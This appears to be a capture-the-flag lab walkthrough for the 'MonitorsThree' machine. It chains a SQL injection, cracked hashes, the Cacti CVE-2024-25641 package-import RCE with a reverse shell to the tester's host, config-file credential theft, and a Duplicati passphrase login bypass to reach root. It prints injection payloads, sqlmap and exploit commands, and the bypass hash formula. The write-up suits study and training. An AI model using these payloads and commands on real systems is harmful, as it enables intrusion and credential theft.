# MonitorsThree

**Target:** 10.129.52.125
**Status:** **ROOTED** — user.txt (marcus) + root.txt captured.
**Started:** 2026-08-25 · Rooted: 2026-08-25

---

## Kill chain

```
[x] recon        — 22 ssh / 80 nginx / 8084 filtered; /admin packaged panel
[x] foothold     — unauth SQLi POST /forgot_password.php (error-based EXTRACTVALUE, MariaDB)
                   → dumped monitorsthree_db.users = admin + mwatson, MD5 hashes
                   → CRACKED admin MD5 = greencacti2001 (rockyou)
                   → vhost cacti.monitorsthree.htb = Cacti 1.2.26 (login admin:greencacti2001)
                   → CVE-2024-25641 Package-Import RCE → SHELL as www-data
[x] user.txt     — www-data read cacti config → cactiuser DB creds → cacti.user_auth
                   → cracked marcus bcrypt = 12345678910 → su marcus (password reuse)
[x] privesc      — Duplicati 2.0.8.1 (127.0.0.1:8200), read server-passphrase from
                   Duplicati-server.sqlite → forged login (auth bypass). Duplicati (Docker)
                   runs as ROOT with host / mounted at /source/ → backup/restore = root R/W.
[x] root.txt     — backup SOURCE /source/root/ → restore to /source/tmp/loot with
                   "restore permissions" UNCHECKED (→ world-readable) → cat /tmp/loot/root.txt
```

One-line summary: **SQLi → cracked Cacti admin → Cacti RCE (www-data) → cactiuser DB → marcus
bcrypt (reuse) → user → Duplicati passphrase theft + auth bypass → root via /source backup/restore.**

---

## §1 Infrastructure
- IP: 10.129.52.125  (vhost: monitorsthree.htb)
- OS: Ubuntu 22.04 (Jammy) — inferred from `OpenSSH 8.9p1 Ubuntu 3ubuntu0.10`
- Ports (`scans/scripts.nmap`, full `-p-`):
  - **22/tcp**  OpenSSH 8.9p1 Ubuntu — hostkeys ECDSA + ED25519
  - **80/tcp**  nginx 1.18.0 (Ubuntu) — title "MonitorsThree - Networking Solutions"
  - **8084/tcp** filtered (nmap guessed "websnp" purely from port#; filtered = no SYN-ACK, firewalled or bound internal). Note it; can't reach it yet.

## §2 Enumeration

### Contact / domain (from site footer)
- Domain: **monitorsthree.htb** → add to `/etc/hosts` for 10.129.52.125
- Email: sales@monitorsthree.htb  (naming scheme: `<dept/word>@monitorsthree.htb`)
- Address: 2269 Elba Lane, Harlow, London, UK · phone 888-555-2311
  - flavor text, but hold the address/phone in case something wants a "prove you're the owner" answer later

### Vhosts
- **`cacti.monitorsthree.htb`** — found via ffuf Host-header fuzz (DirBuster list;
  "cacti" happened to be in it). Add to `/etc/hosts`. → the real **Cacti** install.
  Use `admin:greencacti2001` here. Get the **version** (footer / login page / CHANGELOG).
- apex `monitorsthree.htb` = marketing site + `/admin`.
- Cacti app is served under **`/cacti/`** (login redirects to `…/cacti/`), so real
  paths are `cacti.monitorsthree.htb/cacti/index.php` etc.

### Directory brute (`scans/root_scan.results`, ffuf, DirBuster medium, recursion depth 2)
Static/site dirs (301):
- `/images/` → `/images/blog/`, `/images/services/`
- `/css/`, `/js/`, `/fonts/`
- `/css/css2` (200, 11647 B, octet-stream) — a locally-served Google-Fonts `css2` blob, not interesting

The one that matters:
- **`/admin/`** (301) — separate admin app, has its own asset tree:
  `/admin/assets/{images,css,js,swf,locales,less}/`
  - That `swf` + `less` + `locales` asset layout is a packaged/off-the-shelf admin
    framework fingerprint, not a hand-rolled panel. Worth identifying the exact
    software+version (page source, README, /admin/assets/ file names, version string)
    before poking it — a named version buys you a CVE search.

## §3 Foothold

### SQLi — `POST /forgot_password.php`, param `username`  (port 80 main site)
- `username=test'` triggers it. Unauthenticated (only needs a PHPSESSID).
- PHP + nginx → back-end DB almost certainly **MySQL/MariaDB**.
- To characterise before exploiting, compare 3 responses:
  - `username=test`   (valid-shaped, no quote)  → baseline
  - `username=test'`  (odd number of quotes)     → error / 500 / different page?
  - `username=test''` (balanced quotes)          → back to baseline?
  If `'` breaks it and `''` heals it, the value is landing unquoted-and-unescaped
  inside a string literal. That triple tells you it's injectable AND whether
  errors are reflected (error-based) or you're flying blind (boolean/time).
- **CONFIRMED injectable** (sqlmap `-r forgotPasswordSQLi.request --risk=2 --level=3 --batch`)
  - Back-end: **MySQL** (>= 5.0.12)
  - Endpoint 302-redirects back to itself; followed redirect + resent POST = fine.
  - First hit: `MySQL >= 5.0.12 stacked queries (comment)`. Note the ~60s gap on
    that test → it's the **time-based** confirmation (sqlmap timed a delay), not
    a visible-error hit. Stacked-query detection here is via timing, so don't
    assume multi-statement RCE works — mysqli/PDO usually run single statements.
  - sqlmap still checking false-positive + probing UNION (1–60 cols) when I saw it.
    If UNION or error-based lands too, prefer those — dumping is orders of
    magnitude faster than time-based blind.
- **Verbose error IS reflected — on the 302 target page:**
  `SQLSTATE[42000] ... 1064 ... MariaDB server version ... near ''test''' at line 1`
  - DB is **MariaDB** (PDO front-end → `SQLSTATE[42000]`).
  - This is **error-based** (reflected 1064) → far faster than the time-based
    technique sqlmap first found. Context confirmed: `WHERE username='<in>'`,
    single-quoted string, unescaped.
  - sqlmap missed it because the error shows only after the redirect; its
    error-based probes weren't matching that reflected text. Steer it:
    `--parse-errors --technique=E --dbms=mysql` (MariaDB fingerprints as MySQL).
  - Manual is very tractable here too: EXTRACTVALUE trick reads output straight
    out of the 1064 message, e.g.
    `username=test' AND extractvalue(1,concat(0x7e,(SELECT ...)))-- -`
    (~31-char cap per read via `~`; page/substr for longer values).
- **`--technique=E` → "not seem to be injectable".** Diagnosis: the reflected
  1064 renders only on the **redirect target**, not the immediate 302 reply.
  sqlmap error-based scans the immediate response for its marker → never sees it.
  This is effectively **second-order** (inject here, read there). Time-based
  survived before only because it needs nothing in the body (pure timing).
  Fixes:
    - Stay in sqlmap: add `--second-url="http://monitorsthree.htb/forgot_password.php"`
      (or `--second-req=forgotPasswordSQLi.request`) so it reads the page where
      the error renders. `--technique=E --parse-errors --dbms=mysql`.
    - Manual EXTRACTVALUE (proven — we see the 1064 by eye):
      `test' AND extractvalue(1,concat(0x7e,database()))-- -`
      then group_concat over information_schema; page long values with
      `SUBSTRING(x,32,31)` (extractvalue truncates ~31 chars).
- With `--second-url`, error-based EXTRACTVALUE injection **confirmed & stored**:
  `... AND EXTRACTVALUE(N,CONCAT(0x5c,0x717a766271,(subquery),0x716a767671))`.
  Proof channel works end-to-end: `parsed DBMS error: '1105 XPATH syntax error:
  '\qzvbq1qjvvq''` (both delimiters back, value `1`). Short values fine.
- Real-data fetch returned empty → sqlmap suggests `--no-cast`/`--hex`.
  Cause: default `CAST(... AS NCHAR)` wrapping comes back NULL on MariaDB.
  **Fix = `--no-cast`** (NOT `--hex` — hex doubles length, worsens the 32-char
  XPATH truncation). Next try:
  `sqlmap -r ... --dbms=mysql --technique=E --parse-errors --second-url=... --no-cast -v3 --current-db`
  Canary on `--current-db` (short), then `--tables`/`--dump` table-by-table.
  If still empty → second-order channel too flaky for sqlmap; go manual EXTRACTVALUE.
- `monitorsthree_db` tables (via `--no-cast`): **`invoices`, `tasks`, `invoice_tasks`**.
  → NO users/accounts table here. This DB is business data only.
  → `--dbs` count was 2 (= information_schema + monitorsthree_db), so app_user
     is scoped tight — can't see a separate admin-panel DB from here.
- Open next: dump the 3 tables (creds/notes can hide in invoice/task text fields);
  the login credential store for the site / `/admin` panel is elsewhere — either
  seeded from something in these tables, or a different vector into `/admin`.

## §4 Loot & credentials

- DB reached via SQLi: **`monitorsthree_db`** (only app DB besides info_schema).
- DB user: **`app_user@localhost`**, **NOT DBA** → no FILE priv expected →
  SQLi is read-only exfil (no `INTO OUTFILE` webshell / no `LOAD_FILE`).
  Purpose of the injection = harvest creds to reuse (admin panel / SSH).

| user | secret | source | works on |
|------|--------|--------|----------|
| app_user | **php_app_password** | `~/html/app/admin/db.php` (as www-data) | MariaDB monitorsthree_db ONLY (`GRANT ALL ON monitorsthree_db.*` — can't see `cacti` db; explains why SQLi never did) |
| admin (likely) | **greencacti2001** | MD5 `31a181…` cracked (rockyou) | → try `/admin` (Cacti), SSH |
| cactiuser (DB) | **cactiuser** | `/var/www/html/cacti/include/config.php` (as www-data) | MariaDB → sees `cacti` + `mysql` DBs (app_user couldn't) |
| mwatson | MD5 `c585d0…` — NOT cracked (rockyou) | users table | try rules/other lists later |
| marcus | **12345678910** | bcrypt `$2y$10$Fq8wGX…` from `cacti.user_auth`, cracked rockyou | → `su marcus` / SSH → **user.txt** |

**`/admin` = likely Cacti** (evidence: cracked pw contains "cacti"; column-brute hit
`hostid`/`pno` = Cacti schema; monitoring-themed box). NEXT: log into `/admin` with
admin:greencacti2001, confirm it's Cacti, note the **version** → Cacti has multiple
serious RCE CVEs; match the version to a known one.

### Cacti user accounts (User Management panel, as admin)
| user | id | realname | enabled | last login |
|------|----|----------|---------|------------|
| admin | 1 | Administrator | yes | 2026-08-25 19:25 |
| guest | 3 | Guest Account | no | 2024-05-18 22:10 |
| marcus | 4 | Marcus | yes | N/A |
- `marcus` was NOT in the SQLi users table (that had admin + mwatson). New name.

### DB map — via `forgot_password.php` SQLi (error-based EXTRACTVALUE)
Legend: ✓ clean read · ~ partial/truncated (re-read) · ? not yet enumerated

**Server**
| item | value | notes |
|------|-------|-------|
| DBMS | MariaDB (MySQL fork) ≥ 5.1 | ✓ |
| current_user | `app_user@localhost` | ✓ non-DBA, no FILE priv |
| databases (count 2) | `information_schema`, `monitorsthree_db` | ✓ app_user scoped to these |

**`monitorsthree_db` — 3 tables** (✓ count matched)
| table | columns | status |
|-------|---------|--------|
| `invoices` | `invoice_id`, `due_date`, `total_due`, `invoice_date` | ✓ 2 rows financials only — **no creds, dead end** |
| `tasks` | `id`, `customer_id`, `status`, `due_date`, `priority` | ✓ 5 cols. 2 rows, sparse metadata — **no creds, dead end** |
| `invoice_tasks` | `task_id`, `invoice_id` | ✓ join table, id pairs only — **dead end** |
| `users` | `id`, `username`, `password` | ✓✓ **CRED STORE** (missed by `--tables`, found via `--search`). Users: `admin`, `mwatson`. Pwds = **MD5** (32 hex). See loot/hashes.txt |

**All 3 tables dumped → zero credentials. monitorsthree_db is business data only.**

### Where are the creds? — the logic + the pivot
- `forgot_password.php` = `... WHERE username='<in>'`; `'` gave a clean **1064
  SYNTAX error**, NOT "Unknown column 'username'". ⇒ base query is valid ⇒ a
  table WITH a `username` column exists AND app_user can SELECT it. None of the
  3 dumped tables have a username column ⇒ **there's an unseen users table**
  (dropped by lossy `--tables`, or in another schema app_user can read).
- Because app_user runs that lookup, it MUST have SELECT on that table ⇒ it will
  appear in `information_schema.columns`. So search by COLUMN name, not table:
  `sqlmap ... --no-cast --retries=10 --search -C username,password,email,user,pass`
  → locates the credential store wherever it lives.
- **RESULT: `--search -C username` → `monitorsthree_db.users`** exists. The earlier
  `--tables` (reported 3) **DROPPED this table** on a lossy read — proof the channel
  silently loses rows. `--search` surfaced it in one clean read.
  → Dump it: `--dump -T users -D monitorsthree_db --no-cast --retries=10`.
  → Hashes are long (>21 usable chars/read) ⇒ sqlmap must chunk+stitch each one;
    most retry-sensitive op yet — re-run if a hash comes back short/garbled.

### Cacti RCE — `cacti.monitorsthree.htb`, authenticated as admin:greencacti2001
- **Version: Cacti 1.2.26** (footer). Vulnerable to **CVE-2024-25641** (public CVE,
  confirm via searchsploit/NVD): authenticated **arbitrary file write → RCE** through
  **Package Import** (Console → Import/Export → Import Packages). Fixed in 1.2.27.
- Mechanism: package = XML bundle of files + signature. Importer writes bundled files
  to disk without constraining path/ext → smuggle a `.php` into webroot → browse it =
  exec as web user (`www-data`?). Signature is validated against the key embedded IN
  the package → PoC self-signs, passes. (Same "presence-only signature check" shape as Era.)
- **WORKED** — `exploits/exploit.py` (D3Ext PoC, heavily patched — see §9) →
  reverse shell as **www-data** on 9001. Payload written to
  `/var/www/html/cacti/resource/<rand>.php` (docroot=/var/www/html, app under /cacti),
  triggered by GET `…/cacti/resource/<rand>.php`.
- ⚠ **Racy**: the 2-step import references the PHP upload temp `/tmp/phpXXXX`, which
  is deleted after the preview request. If the confirm POST loses the race → file
  404s ("doesn't exist"). Just **re-run** until it lands (worked on 2nd try).
- Gives web-user shell = foothold. user.txt needs a further pivot (mwatson? cacti DB config? reuse?).

## §5 Privesc
### Listening services as marcus (`ss -tulpn`)
| bind | port | notes |
|------|------|-------|
| 0.0.0.0 | 22, 80 | ssh, nginx (external) |
| 0.0.0.0 | **8084** | the nmap-"filtered" port — open, just firewalled from outside. Reachable on-box. ? |
| 127.0.0.1 | **8200** | **Duplicati 2.0.8.1** (login.js?v=2.0.8.1) — classic nonce/HMAC login (not JWT). `Server: Tiny WebServer`, 302→/login.html, xsrf-token cookie. Runs privileged → privesc surface. |
| 127.0.0.1 | 46117 | internal high port, ? (poller/helper?) |
| 127.0.0.1 | 3306 | MariaDB |
- Internal-only binds (8200, 46117) = the privesc surface: not reachable externally,
  so that's usually where the escalation lives. Fingerprint each (`curl`/headers).
- ss showed no PID/Program (need root for that); marcus can still curl the ports.

### Duplicati (8200) — privesc lead
- Login is passphrase-based (challenge/response), NOT a plain form password. The
  server passphrase is stored on disk in Duplicati's config DB (`Duplicati-server.sqlite`)
  → the way in is READING it from a file, then forging the login, not guessing.
- Runs privileged; once in the UI, backup/restore = arbitrary root-owned file read/write.
- Access: `curl` on-box, or SSH tunnel `ssh -L 8200:127.0.0.1:8200 marcus@10.129.52.125`
  to drive the web UI in a real browser.
- Config DB: **`/opt/duplicati/config/Duplicati-server.sqlite`** (marcus-readable; no
  sqlite3 on box → scp to Kali, or python3 stdlib). Tables: Backup, Option, Schedule, …
- Login secret lives in **`Option`** table: `server-passphrase` + `server-passphrase-salt`.
- **Backup job "Cacti 1.2.26 Backup"** → TargetURL `file:///source/opt/backups/cacti/`.
  - **KEY:** Duplicati runs in a **Docker container**; `/source` is a container mount, NOT a
    host dir (that's why `ls /` shows no /source). Mounts (from config): host
    `/opt/duplicati/config`→`/config`, host `/`→`/source` (confirm via where /opt/backups/cacti
    backup files land on host). So container `/source/<path>` = host `/<path>`, written as root.
  - **CONFIRMED `/source` = host `/`**: cacti backup dblocks (target `/source/opt/backups/cacti`)
    live on host at `/opt/backups/cacti/`. So `/source/root/`=host `/root`, `/source/tmp/loot`=host `/tmp/loot`.
  - ⚠ Restore preserves original perms/owner → root.txt would stay root:root 400.
    **FIX: in the restore dialog UNCHECK "Restore read/write permissions"** → files land
    with default (root:root ~644) perms = world-readable → marcus can read. Then also grab
    /root/.ssh/id_rsa from the restore for a real root shell (`ssh -i id_rsa root@`).
- **Option table dumped.** Login secret (only server-passphrase needed for bypass):
  - `server-passphrase` = **`Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=`**  (= SHA256(utf8(pw)+salt), base64)
  - `server-passphrase-salt` = `xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I=` (not needed — only derives the hash from plaintext)
  - `allowed-hostnames = *` (no Host filtering → tunneling fine)
- Login bypass = answer the nonce challenge with the stolen salted hash:
  `answer = base64(SHA256(nonce_bytes + b64decode(server-passphrase)))`. No plaintext pw needed.
  Script: `exploits/duplicati_login.py` (run from Kali via `ssh -L 8200:127.0.0.1:8200 marcus@…`).
  - Auth handler is **`/login.cgi`** (per loot/login.js), NOT /login.html (that's the GUI page).
    Flow: GET / (sets xsrf-token cookie) → POST /login.cgi get-nonce=1 → answer → POST /login.cgi password=.
  - Hash (from login.js): saltedpwd = b64decode(server-passphrase); noncedpwd = b64(SHA256(nonce_bytes+saltedpwd)).
- **AUTH BYPASS WORKED** — `duplicati_login.py` → `{"Status":"OK"}`, got
  `session-auth=zDDD4jUptKZ0iW2xldk-SYMRmegCVLAW6oBECCUPEnI` (rotates per login).
- **ROOT — WORKED.** Injected the 3 session cookies into the tunneled Duplicati UI
  (browser DevTools → Storage; session-auth is HttpOnly so set it there, not console),
  logged into the console, then:
  - New backup, No encryption, dest `/source/tmp/rootbak`, **Source Data `/source/root/`** → Run now.
  - Restore → **Pick location `/source/tmp/loot`** → **UNCHECK "Restore read/write permissions"**
    (so files land root:root ~644 = world-readable, not root.txt's original 400).
  - On box: `cat /tmp/loot/root.txt` → **root flag**. (Also grab /tmp/loot/.ssh/id_rsa for a
    real root shell: `ssh -i id_rsa root@10.129.52.125`.)
- Cookies rotate per login; if the UI 401s, re-run `duplicati_login.py` for fresh values.

## §6 Dead ends
- **`monitorsthree_db` invoices/tasks/invoice_tasks** — business data only, no creds.
- **mwatson MD5** `c585d0…` — never cracked (rockyou). Not needed; marcus was the pivot.
- **8084** (nmap-"filtered", open on-box) and **46117** (localhost) — never needed;
  Duplicati on 8200 was the privesc. Would fingerprint them on a re-visit.
- **`/admin` path** on apex — the site's own admin app (customers/invoices/tasks/users
  .php + db.php). Useful only for the `app_user:php_app_password` in db.php; the RCE
  path was the separate `cacti.` vhost, not this.
- **SQLi as www-data/INTO OUTFILE** — dead: app_user non-DBA, no FILE priv.

## §7 Lessons
- **Lossy SQLi channel: negative results are worthless.** `--tables` reported 3
  (invoices/tasks/invoice_tasks) but MISSED `users`. Why: `--tables` = COUNT read +
  one read PER row, all through the flaky second-order flash channel. A low/dropped
  count silently caps the loop → missing rows, NO error printed. `--search -C username`
  found `users` because it needed ~1 clean read, not N. Rule: on a flaky channel,
  reliability ∝ 1/(reads required). "3 tables" meant "3 survived this run," not "3 exist."
  Once a table name is known, go straight to `--dump -T <name>` and skip discovery.
- **Error reflected on the REDIRECT = second-order to sqlmap.** Only time-based survived
  auto-detection at first because it needs nothing in the body. Fix: `--second-url` so
  sqlmap reads the page where the 1064 renders; `--parse-errors`; `--no-cast` (CAST→NULL
  on MariaDB); NOT `--hex` (doubles length vs the 32-char XPATH cap).
- **Fingerprint → version → CVE, every time.** Same discipline unlocked both stages:
  Cacti 1.2.26 → CVE-2024-25641; Duplicati 2.0.8.1 (from `login.js?v=`) → classic auth.
  A named version turns "poke blindly" into "look up the exact technique."
- **When a PoC misbehaves, read the app's own client code.** `login.js` handed us the
  real endpoint (`/login.cgi`, not `/login.html`) and the exact hash — ended the guessing.
- **Secrets on disk beat cracking.** Duplicati login isn't brute-forced — the salted
  hash (`server-passphrase`) IS the credential; read it from the sqlite and answer the
  nonce challenge with it. Same shape as the Cacti DB creds sitting in config.php.
- **Password reuse is the connective tissue.** Cacti admin pw ~ "cacti"; marcus reused
  his Cacti bcrypt password (12345678910) for his Linux account. Always try creds laterally.
- **Containerized service = watch the path prefix.** Duplicati's `/source/` = host `/`.
  A service running as root that can read/write the host FS via a mount prefix is an
  instant privesc; the TargetURL (`file:///source/…`) is what gave it away.
- **"Filtered" ≠ closed.** 8084 was open all along, just firewalled externally; internal
  binds (8200) never appear in an external scan. Re-enumerate ports from every new shell.

## §8 Command log
_(commands actually run against the target, with results + coverage caveats)_

1. `nmap -p- -sV -sC -oA scripts monitorsthree.htb`
   → 22 ssh (OpenSSH 8.9p1), 80 nginx 1.18.0, 8084 filtered. (`scans/scripts.*`)
2. `ffuf -u http://monitorsthree.htb/FUZZ -w DirBuster-medium -recursion -recursion-depth 2`
   → /admin (packaged panel), static dirs. (`scans/root_scan.results`)
   ⚠ default DirBuster list = comments included; recursion only depth 2.
3. Manual Burp: `POST /forgot_password.php` `username=test'`
   → 302 → landing page shows `1064 ... MariaDB ... near ''test'''` = SQLi (error-based).
   Saved as `loot/forgotPasswordSQLi.request`.
4. sqlmap progression (all `-r forgotPasswordSQLi.request --batch`):
   - `--risk=2 --level=3` → stacked/time-based only (immediate response, no reflected data).
   - `--technique=E` → "not injectable" (error renders post-redirect, not in immediate reply).
   - `--technique=E --parse-errors --second-url="…/forgot_password.php"` → **error-based
     EXTRACTVALUE confirmed & stored** (second-order fix).
   - add `--no-cast` (CAST→NULL fix) → `current_user=app_user@localhost` (NOT DBA),
     `current_db=monitorsthree_db`, `--dbs` count 2 (info_schema + monitorsthree_db).
   - `--tables -D monitorsthree_db` → invoices/tasks/invoice_tasks **(MISSED `users` — lossy)**.
   - `--dump` those 3 → business data only, no creds.
   - `--search -C username` → **`monitorsthree_db.users`** (found the missed table).
   - `--dump -T users -C username,password --retries=10` → users **admin**, **mwatson**;
     MD5 hashes, **row-misaligned + one truncated** (see loot/hashes.txt). Took ~6 re-runs.
   - re-dump per-user `--where "username='admin'"` → clean full hashes.
   ⚠ Channel is flaky (second-order flash) + XPATH-truncated (32 ch). Reliability ∝ 1/reads.
5. `hashcat -m 0 <admin md5> rockyou` → **greencacti2001** (mwatson md5 uncracked).
6. Cacti login `admin:greencacti2001` @ cacti.monitorsthree.htb → **v1.2.26**.
7. `exploits/exploit.py --url http://cacti.monitorsthree.htb --user admin --password greencacti2001
   --lhost <tun0> --lport 9001` (patched; re-run on 404 race) → rev shell **www-data**.
8. As www-data: `cat ~/html/app/admin/db.php` → app_user:php_app_password;
   `cat /var/www/html/cacti/include/config.php` → cactiuser:cactiuser + db `cacti`.
9. `mysql -u cactiuser -pcactiuser cacti` → `SELECT * FROM user_auth` → marcus bcrypt.
   `hashcat -m 3200 <marcus bcrypt> rockyou` → **12345678910**.
10. `su marcus` (12345678910) → user.txt. Then `ss -tulpn` → Duplicati 127.0.0.1:8200.
11. `scp .../Duplicati-server.sqlite` → `strings|grep passphrase` → server-passphrase.
12. `ssh -L 8200:127.0.0.1:8200 marcus@…` + `python3 exploits/duplicati_login.py --url
    http://127.0.0.1:8200 --passphrase '<b64>'` → `{"Status":"OK"}` + session-auth.
13. Inject cookies into tunneled Duplicati UI → logged into console.
14. Backup SOURCE `/source/root/` → Run → Restore to `/source/tmp/loot` with
    "restore permissions" UNCHECKED → `cat /tmp/loot/root.txt` → **root.txt**.

## §9 Files
- `exploits/exploit.py` — D3Ext CVE-2024-25641 Cacti 1.2.26 PoC. Fully patched locally:
  (1) `import sys`; (2) login check (`'Logged in'` never matches → test login-form-gone);
  (3) **app served under `/cacti/`** — derive `app_base` from post-login redirect,
  use it for all URLs (was hitting bare host → wrong paths); (4) refresh CSRF after
  login (Cacti rotates it); (5) match uploaded file by `…/resource/<name>` suffix
  instead of hardcoded `/var/www/html/cacti/resource/`. Runs clean now.
  Payload writes to `/var/www/html/cacti/resource/<rand>.php`, triggered by GET.
  ⚠ 2-step import is racy on the PHP upload temp file → re-run if the payload 404s.
- `exploits/duplicati_login.py` — Duplicati 2.0.8.1 auth bypass via stolen
  `server-passphrase`. GET / (xsrf cookie) → POST /login.cgi get-nonce → answer the
  nonce with the salted hash → session-auth cookie. Run via SSH tunnel to 8200.
- `loot/forgotPasswordSQLi.request` — Burp request feeding sqlmap (`-r`).
- `loot/hashes.txt` — monitorsthree_db.users MD5s. admin=greencacti2001 (cracked), mwatson uncracked.
- `loot/cacti_hashes.txt` — cacti.user_auth bcrypts. **marcus=12345678910** (cracked).
- `loot/Duplicati-server.sqlite` — scp'd Duplicati config DB; holds server-passphrase (Option table).
- `loot/login.js` — Duplicati client login code; revealed `/login.cgi` + the hash algorithm.
- `scans/scripts.*` — nmap -p- -sC -sV. `scans/root_scan.results` — ffuf dirs.

---

## Full kill chain (one place)
1. **Recon** — 80 nginx (monitorsthree.htb) + 22 ssh + 8084 filtered. ffuf → `/admin`.
2. **SQLi** — unauth error-based EXTRACTVALUE in `POST /forgot_password.php` (`username`),
   reflected on the 302 target (second-order). MariaDB, app_user (non-DBA).
3. **Creds** — dump `monitorsthree_db.users` (found via `--search`, `--tables` missed it):
   admin MD5 → **greencacti2001** (rockyou).
4. **Cacti** — vhost `cacti.monitorsthree.htb`, v1.2.26. Login admin:greencacti2001.
5. **RCE** — CVE-2024-25641 Package-Import → PHP in `/cacti/resource/` → **www-data**.
6. **Lateral (config theft)** — read cacti `config.php` → cactiuser:cactiuser →
   `cacti.user_auth` → marcus bcrypt → **12345678910** (rockyou).
7. **User** — `su marcus` (password reuse). user.txt.
8. **Duplicati** — internal 8200 (root, Docker). Steal `server-passphrase` from
   Duplicati-server.sqlite → **auth bypass** (answer nonce with the salted hash, no password).
9. **Root** — Duplicati runs as root with host `/` at `/source/`; backup `/source/root/` →
   restore to `/source/tmp/loot` (permissions unchecked = world-readable) → **root.txt**.

Through-line: **every hop was a secret sitting in a file the current user could already read**
— DB creds in `db.php`/`config.php`, password hashes in two DBs, the Duplicati passphrase in
its sqlite. Little was cracked/guessed; most was read and reused. Plus one privileged service
(Duplicati-as-root with a host-FS mount) turning "I can read a config" into full root.
